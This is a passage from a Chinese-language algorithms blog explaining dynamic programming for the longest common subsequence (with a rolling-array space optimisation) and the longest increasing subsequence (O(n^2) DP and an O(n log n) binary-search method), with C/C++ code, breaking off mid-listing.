class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXM 1000</span></span><br><span class="line"><span class="type">int</span> a[MAXN], b[MAXM], f[MAXN][MAXM];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++)</span><br><span class="line">      <span class="keyword">if</span> (a[i] == b[j])</span><br><span class="line">        f[i][j] = f[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        f[i][j] = <span class="built_in">std</span>::max(f[i - <span class="number">1</span>][j], f[i][j - <span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> f[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>易知该方法的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(mn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>,空间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(mn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><h2 id="空间优化-一维dp">空间优化(一维DP)</h2><p>根据状态转移方程容易发现,当前行的各状态只与上一行的各状态有关,因此可以将<code>n*m</code>的dp数组优化为只有一行的滚动数组.</p><p>当外层循环到第i层时,dp数组代表当循环到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S_1[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span>字符时的状态数组.更新<code>dp[j]</code>,即为更新原二维dp中的<code>dp[i][j]</code>.此时的<code>dp[j]</code>保存的&quot;应该&quot;是<code>dp[i-1][j]</code>,而<code>dp[j-1]</code>中保存的是<code>dp[i][j-1]</code>,现在的问题是如何获取<code>dp[i-1][j-1]</code>.</p><p>可以使用一个old变量,来保存当前循环时,更新前的<code>dp[j]</code>,即为&quot;当前&quot;的<code>dp[i-1][j]</code>,那么当循环到下一次时(即第j+1个字符),old的值就是<code>dp[i-1][j-1]</code>(即该值已成为过去式).</p><p>另外,尽管使用一个old来存储<code>dp[i-1][j-1]</code>,但是在循环中难免要获取更新的值,使用一个temp变量来临时存储.</p><p>由此便可将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(mn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>的空间复杂度优化为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span>,不过代码较难理解,代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXM 1000</span></span><br><span class="line"><span class="type">int</span> a[MAXN], b[MAXM], f[MAXM];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> temp = <span class="number">0</span>, old = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">old = f[<span class="number">0</span>]; <span class="comment">// 设置初始的old=f[i-1][0]</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; ++j) &#123;</span><br><span class="line">temp = f[j]; <span class="comment">// 当前,更新前的f[i-1][j]</span></span><br><span class="line"><span class="keyword">if</span> (a[i] == b[j]) &#123;</span><br><span class="line">f[j] = old + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">f[j] = <span class="built_in">std</span>::max(f[j - <span class="number">1</span>], f[j]);</span><br><span class="line">&#125;</span><br><span class="line">old = temp; <span class="comment">// 更新新的old值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> f[m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="最长上升子序列-lis">最长上升子序列(LIS)</h1><h2 id="法一-o-n-2-的dp">法一:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的DP</h2><p>给定字符串S,求其LIS.</p><p>定义<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f[i](i \in [1,n])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span>为串S的以字符<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span>结尾的最长上升子序列的长度.</p><p>最终答案<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>I</mi><mi>S</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">{</mo><mi>f</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">LIS(S)=max\{f[1],f[2],...,f[n]\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">{</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mclose">}</span></span></span></span></p><p>有状态方程如下:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>初始条件</mtext><mo>:</mo><mtext> </mtext><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mn>1</mn><mo stretchy="false">(</mo><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">{</mo><mi>f</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">}</mo><mtext> </mtext><mo stretchy="false">(</mo><mn>1</mn><mo>≤</mo><mi>j</mi><mo>&lt;</mo><mi>i</mi><mo separator="true">,</mo><mi>S</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>&lt;</mo><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">初始条件:\ f[i]=1 (1 \le i \le n)\\f[i]=max\{ f[j]+1,f[i] \}\ (1 \le j \lt i,S[j] \lt S[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">初</span><span class="mord cjk_fallback">始</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace"> </span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79549em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">{</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">}</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><p>代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 5001</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">(<span class="type">int</span> s[], <span class="type">int</span> f[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i) &#123;</span><br><span class="line">f[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;j &lt; i;++j) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[j] &lt; s[i]) &#123;</span><br><span class="line">f[i] = max(f[i], f[j] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = max(ans, f[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> s[MAXN];</span><br><span class="line"><span class="type">int</span> f[MAXN];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i)</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; s[i];</span><br><span class="line"><span class="type">int</span> ans = dp(s, f, n); <span class="comment">// dp</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="法二-o-nlogn-的贪心-二分查找">法二:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nlogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>的贪心+二分查找</h2><p>使用一个<code>low[]</code>数组.其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">low[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span>代表长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>的LIS序列结尾元素的最小值.</p><p>我们对整个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>进行遍历,每次访问<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span>,检查其和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">[</mo><mi>a</mi><mi>n</mi><mi>s</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">low[ans]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mclose">]</span></span></span></span>的大小关系,如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>&gt;</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">[</mo><mi>a</mi><mi>n</mi><mi>s</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i] \gt low[ans]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mclose">]</span></span></span></span>,则直接将其连接在<code>low[ans]</code>后面;否则,搜索<code>low[]</code>中第一个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≥</mo><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\ge s[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span>的元素,并对其进行替换.</p><p>最终ans即为所求的LIS长度.</p><p>显然<code>low[]</code>数组是严格不下降的,因此对于<code>low[]</code>的搜索可以使用二分查找来优化.这样便可以将时间复杂度优化为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nlogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>.</p><p>需要注意的是,<code>now[]</code>数组中存储的并不一定是正确的最长上升子序列,而是为后续的迭代做好准备的序列.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 5001</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">(<span class="type">int</span> s[], <span class="type">int</span> f[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// 朴素DP</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i) &#123;</span><br><span class="line">f[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;j &lt; i;++j) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[j] &lt; s[i]) &#123;</span><br><span class="line">f[i] = max(f[i], f[j] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span 